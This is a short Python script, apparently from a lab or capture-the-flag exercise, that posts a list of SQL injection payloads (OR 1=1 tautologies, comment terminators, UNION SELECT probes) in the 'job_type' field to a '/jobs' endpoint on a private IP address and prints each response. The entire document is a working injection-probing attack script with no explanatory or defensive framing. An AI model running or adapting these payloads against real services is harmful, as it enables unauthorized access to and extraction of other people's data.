import requests
import json

def main():
    url = "http://10.0.162.112:80/jobs"
    
    payloads = [
        "back-end' OR '1'='1",
        "back-end' OR 1=1--",
        "back-end' UNION SELECT 1,2,3,4--",
        "private' OR '1'='1",
        "private'--",
        "' OR 1=1--",
        "' OR '1'='1",
        "back-end' AND 1=1--",
        "back-end\\",
        "back-end'",
        "private' OR 1=1--",
        "private' UNION SELECT 1,2,3,4--"
    ]
    
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    
    for i, payload in enumerate(payloads, 1):
        data = {"job_type": payload}
        try:
            response = session.post(url, json=data)
            print(f"--- Payload {i} ---")
            print(f"Payload: {payload}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Body: {response.text}\n")
        except requests.exceptions.RequestException as e:
            print(f"--- Payload {i} ---")
            print(f"Payload: {payload}")
            print(f"Request failed: {e}\n")

if __name__ == "__main__":
    main()